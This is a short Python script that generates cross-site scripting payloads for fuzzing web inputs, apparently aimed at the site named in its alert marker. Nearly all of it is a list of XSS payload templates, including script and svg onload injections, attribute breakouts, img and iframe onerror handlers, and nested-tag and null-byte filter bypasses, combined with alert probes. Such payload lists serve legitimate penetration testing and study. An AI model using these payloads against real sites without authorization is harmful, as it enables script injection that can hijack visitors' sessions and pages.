#!/usr/bin/env python
# coding=utf-8
# author: b0lu
# mail: b0lu@163.com

fuzzle_msg = "/ganji.com/";
#fevents = ["alert("+fuzzle_msg+")", "prompt("+fuzzle_msg+")", "confirm("+fuzzle_msg+")"];
fevents = ["alert("+fuzzle_msg+")"];
#domevents = ["onmousemove", "onmouseout", "onmouseover", "onclick"];
domevents = ["onclick"];
tplpayloads = [
    "\">'><script>[event]</script>",
    "\">'><svg/onload=[event]>",
    "\">'><scri<script>pt>[event];</scr</script>ipt>",
    "\" onmouseover=[event] x=\"",
    "' onmouseover=[event] x='",
    "\";[event];\"",
    "';[event];'",
    ";[event];",
    "[event];",
]
'''
tplpayloads = [
    "<script>[event]</script>",
    "<scr ipt>[event]</scr ipt>",
    "\"><script>[event]</script>",
    "\"><script>[event]</script><\"",
    "'><script>[event]</script>", 
    "'><script>[event]</script><'",
    "<SCRIPT>[event];</SCRIPT>",
    "<scri<script>pt>[event];</scr</script>ipt>",
    #"<SCRI<script>PT>[event];</SCR</script>IPT>",
    "<scri<scr<script>ipt>pt>[event];</scr</sc</script>ript>ipt>",
    "\";[event];\"",
    "';[event];'",
    ";[event];",
    "[event];",
    "<SCR%00IPT>[event]</SCR%00IPT>",
    "\\\";[event];//",
    #"<STYLE TYPE=\"text/javascript\">[event];</STYLE>",
    "<<SCRIPT>[event]//<</SCRIPT>",
    "<<SCRIPT>[event]//<</SCRIPT>",
    "<img src=\"1\" onerror=\"[event]\">",
    "<img src='1' onerror='[event]'",
    "onerror=\"[event]\"",
    "onerror='[event]'",
    "onload=\"[event]\"",
    "onload='[event]'",
    "<IMG \"\"\"><SCRIPT>[event]</SCRIPT>\">",
    "<IFRAME SRC='f' onerror=\"[event]\"></IFRAME>",
    "<IFRAME SRC='f' onerror='[event]'></IFRAME>",
];
'''
dom_tpl_payloads = [
    "\" [domevent]=\"[event]\" \"",
    "' [domevent]='[event]' '",
];

payloads = [];
for fevent in fevents:
    for tplpayload in tplpayloads:
        tmppayload = tplpayload.replace("[event]", fevent);
        payloads.append(tmppayload)

'''
for dom_tpl_payloads in dom_tpl_payloads:
    for fevent in fevents:
        for domevent in domevents:
            tmppayload = dom_tpl_payloads.replace('[event]', fevent).replace('[domevent]', domevent);
            payloads.append(tmppayload)

'''
    

